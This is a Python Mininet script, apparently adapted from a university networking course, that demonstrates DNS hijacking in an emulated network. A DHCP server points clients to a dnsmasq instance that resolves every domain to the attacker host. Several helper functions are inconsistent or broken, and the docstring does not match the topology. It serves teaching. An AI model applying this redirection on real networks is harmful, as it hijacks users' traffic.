#!/usr/bin/python

"""
Rogue DHCP server demo for Stanford CS144.

We set up a network where the DHCP server is on a slow
link. Then we start up a rogue DHCP server on a fast
link which should beat it out (although we should look
at wireshark for the details.) This rogue DHCP server
redirects DNS to a rogue DNS server, which redirects
all DNS queries to the attacker. Hilarity ensues.

The demo supports two modes: the default interactive
mode (X11/firefox) or a non-interactive "text" mode
(text/curl).

We could also do the whole thing without any custom
code at all, simply by using ettercap.

Note you may want to arrange your windows so that
you can see everything well.
"""

from mininet.net import Mininet
from mininet.topo import Topo
from mininet.link import TCLink
from mininet.cli import CLI
from mininet.util import quietRun
from mininet.log import setLogLevel, info
from mininet.term import makeTerms
from mininet.node import Controller, RemoteController, OVSKernelSwitch, UserSwitch
from mininet.examples.nat import connectToInternet, stopNAT


#from mininet.examples.nat import connectToInternet, stopNAT

from sys import exit, stdin, argv
from re import findall
from time import sleep
import os

def checkRequired():
    "Check for required executables"
    required = [ 'udhcpd', 'udhcpc', 'dnsmasq' ]
    for r in required:
        if not quietRun( 'which ' + r ):
            print '* Installing', r
            print quietRun( 'apt-get install -y ' + r )
            if r == 'dnsmasq':
                # Don't run dnsmasq by default!
                print quietRun( 'update-rc.d dnsmasq disable' )

class DnsTopo( Topo ):
    """Topology for Dns Demo:
       client - switch - link - Dns server
                  """
    def __init__( self, *args, **kwargs ):
        Topo.__init__( self, *args, **kwargs )
        client = self.addHost( 'h1', ip='10.0.0.10/24' )
        switch = self.addSwitch( 's1', protocols=["OpenFlow13"] )
        dns = self.addHost( 'dns', ip='10.0.0.50/24')
        #c0 = self.addController( 'c0', controller=RemoteController, ip='192.168.56.104', port=6633 )
        self.addLink( client, switch )
        self.addLink( dns, switch, bw=10, delay='500ms' )

# dns server
DNSTemplate = """
start		10.0.0.10
end		10.0.0.90
option	subnet	255.255.255.0
option	domain	local
option	lease	7  # seconds
"""
# option dns 8.8.8.8
# interface h1-eth0

def makeDHCPconfig( filename, intf, gw, dns ):
    "Create a DHCP configuration file"
    config = (
        'interface %s' % intf,
        DNSTemplate,
        'option router %s' % gw,
        'option dns %s' % dns,
        '' )
    with open( filename, 'w' ) as f:
        f.write( '\n'.join( config ) )

def startDHCPserver( host, gw, dns ):
    "Start DHCP server on host with specified DNS server"
    info( '* Starting DHCP server on', host, 'at', host.IP(), '\n' )
    dhcpConfig = '/tmp/%s-udhcpd.conf' % host
    makeDHCPconfig( dhcpConfig, host.defaultIntf(), gw, dns )
    host.cmd( 'udhcpd -f', dhcpConfig,
              '1>/tmp/%s-dhcp.log 2>&1  &' % host )

def stopDHCPserver( host ):
    "Stop DHCP server on host"
    info( '* Stopping DHCP server on', host, 'at', host.IP(), '\n' )
    host.cmd( 'kill %udhcpd' )


# DHCP client functions

def startDHCPclient( host ):
    "Start DHCP client on host"
    intf = host.defaultIntf()
    host.cmd( 'dhclient -v -d -r', intf )
    host.cmd( 'dhclient -v -d 1> /tmp/dhclient.log 2>&1', intf, '&' )

def waitForIP( host ):
    "Wait for an IP address"
    info( '*', host, 'waiting for IP address' )
    while True:
        host.defaultIntf().updateIP()
        if host.IP():
            break
        info( '.' )
        sleep( 1 )
    info( '\n' )
    info( '*', host, 'is now using',
          host.cmd( 'grep nameserver /etc/resolv.conf' ) )

def startDnsServer( host ):
    "Start Fake DNS server"
    info( '* Starting fake DNS server', host, 'at', host.IP(), '\n' )
    host.cmd( 'dnsmasq -k -A /#/%s 1>/tmp/dns.log 2>&1 &' %  host.IP() )

def stopDnsServer( host ):
    "Stop Fake DNS server"
    info( '* Stopping fake DNS server', host, 'at', host.IP(), '\n' )
    host.cmd( 'kill %dnsmasq' )

def readline():
    "Read a line from stdin"
    return stdin.readline()


def prompt( s=None ):
    "Print a prompt and read a line from stdin"
    if s is None:
        s = "Press return to continue: "
    print s,
    return readline()

def verifyConnection(client, server):
    print client.cmd('ping -c 1 ' + server.IP())
    print server.cmd('ping -c 1 ' + client.IP())


def dnsdemo( ):
    "Rogue dns server demonstration"
    #checkRequired()
    topo = DnsTopo()
    net = Mininet( topo=topo,
    controller=lambda name: RemoteController( name = 'c0', ip='192.168.56.104' ),
      link=TCLink,
      switch=OVSKernelSwitch,
      autoSetMacs=True)

    h1, dns, sw = net.get( 'h1', 'dns' , 's1')

    #verifyConnection(h1, dns)
    # And an dns server
    net.start()

    rootnode = connectToInternet( net, 's1' )
    #mountPrivateResolvconf( h1 )
    startDHCPserver( dns, gw=rootnode.IP(), dns=dns.IP())
    startDHCPclient( h1 )
    waitForIP( h1 )

    startDnsServer( dns )
    info( '* Fetching google.com:\n' )
    #print h1.cmd( 'curl google.com' )
    #print h1.cmd( 'ifconfig', h1.defaultIntf(), '0' )

    clientRequestToServer(h1)

    stopDnsServer( dns )
    #unmountPrivateResolvconf( h1 )
    net.stop()

def alterDnsClientToLocal(host):
    info( '* Request NsLookup google.com:\n' )
    h1.cmd( "sed -i '/dns-nameservers 8.8.8.8 8.8.4.4/c\       dns-nameservers 10.0.0.50 10.0.0.50' /etc/network/interfaces")

def alterDnsClientToDefaul(host):
    info( '* Request NsLookup google.com:\n' )
    h1.cmd( "sed -i '/dns-nameservers 8.8.8.8 8.8.4.4/c\       dns-nameservers 10.0.0.50 10.0.0.50' /etc/network/interfaces")

def mountPrivateResolvconf( host ):
    "Create/mount private /etc/resolv.conf for host"
    etc = '/tmp/etc-%s' % host
    host.cmd( 'mkdir -p', etc )
    host.cmd( 'mount --bind /etc', etc )
    host.cmd( 'mount -n -t tmpfs tmpfs /etc' )
    host.cmd( 'ln -s %s/* /etc/' % etc )
    host.cmd( 'rm /etc/resolv.conf' )
    host.cmd( 'cp %s/resolv.conf /etc/' % etc )

def unmountPrivateResolvconf( host ):
    "Unmount private /etc dir for host"
    etc = '/tmp/etc-%s' % host
    host.cmd( 'umount /etc' )
    host.cmd( 'umount', etc )
    host.cmd( 'rmdir', etc )

def clientRequestToServer(h1):
    # Make sure we can fetch get request
    info( '* Request NsLookup google.com:\n' )
    #h1.cmd( 'cd Downloads')
    #print h1.cmd( 'pwd')
    qt = 1
    while  qt <= 1:
        #print h1.cmd( 'wget http://10.0.0.56/index.html >& /tmp/index.html &' )
        #print h1.cmd( 'curl http://10.0.0.50' )
        print h1.cmd( 'nslookup google.com' )
        #print h1.cmd( 'nslookup ufpe.com.br' )
        qt= qt + 1

    info( '* End Nslooking Up!:\n' )
def usage():
    "Print usage message"
    print "%s [ -h | -text ]"
    print "-h: print this message"

if __name__ == '__main__':
    setLogLevel( 'info' )
    if '-h' in argv:
        usage()
        exit( 1 )
    #firefox = '-t' not in argv
    dnsdemo()
